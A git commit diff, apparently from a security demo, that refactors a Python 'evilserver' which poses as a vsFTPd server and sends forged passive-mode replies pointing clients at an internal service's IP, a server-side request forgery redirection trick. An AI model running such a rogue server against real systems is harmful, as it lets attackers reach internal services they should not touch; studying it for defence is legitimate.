cb26fa8597845239c78782c2cb8f7b0ab167e13a
David de Barros Tadokoro <davidbtadokoro@usp.br>
2022-06-26 23:26:25 -0300

    Refatora evilserver.py para clareza da demo

--- evilserver/evilserver.py
+++ evilserver/evilserver.py
@@ -3,8 +3,8 @@ import socketserver, threading, requests, subprocess, time, base64, secrets, sys
 
 class MyTCPHandler(socketserver.StreamRequestHandler):
    def handle(self):
-       dataserver_ip = socket.gethostbyname("dataserver");
-       dataserver_ip = re.sub('[.]', ',', dataserver_ip)
+       internalservice_ip = socket.gethostbyname("internalservice");
+       internalservice_ip = re.sub('[.]', ',', internalservice_ip)
 
        print('[+] connected', self.request, file=sys.stderr)
        self.request.sendall(b'220 (vsFTPd 3.0.3)\r\n')
@@ -15,28 +15,22 @@ class MyTCPHandler(socketserver.StreamRequestHandler):
 
        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
-       self.request.sendall(b'227 Entering Passive Mode (' + dataserver_ip.encode('utf-8') + b',43,203)\r\n')
+       self.request.sendall(b'227 Entering Passive Mode (' + internalservice_ip.encode('utf-8') + b',43,203)\r\n')
 
        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
-       self.request.sendall(b'227 Entering Passive Mode (' + dataserver_ip.encode('utf-8') + b',43,203)\r\n')
+       self.request.sendall(b'227 Entering Passive Mode (' + internalservice_ip.encode('utf-8') + b',43,203)\r\n')
 
        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'200 Switching to Binary mode.\r\n')
 
-       self.data = self.rfile.readline().strip().decode()
-       print(self.data, file=sys.stderr)
-       self.request.sendall(b'125 Data connection already open. Transfer starting.\r\n')
-
-       self.data = self.rfile.readline().strip().decode()
-       print(self.data, file=sys.stderr)
-       self.request.sendall(b'250 Requested file action okay, completed.')
        exit()
 
 def ftp_worker():
    with socketserver.TCPServer(('0.0.0.0', 21), MyTCPHandler) as server:
        while True:
            server.handle_request()
+
 threading.Thread(target=ftp_worker).start()
 time.sleep(2)
